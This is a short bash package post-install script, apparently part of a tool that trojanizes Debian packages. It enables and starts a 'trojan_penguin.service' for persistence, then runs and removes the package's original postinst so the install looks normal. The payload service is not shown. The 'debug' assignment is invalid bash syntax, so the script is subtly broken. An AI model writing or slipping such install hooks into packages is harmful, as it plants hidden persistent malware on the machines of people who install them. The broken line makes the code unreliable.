#!/bin/bash

debug = ""

systemctl daemon-reload
systemctl enable trojan_penguin.service
systemctl start trojan_penguin.service

if [ -f $debug/usr/bin/tp_orig_postinst ]; then
  $debug/usr/bin/tp_orig_postinst
  rm $debug/usr/bin/tp_orig_postinst
fi
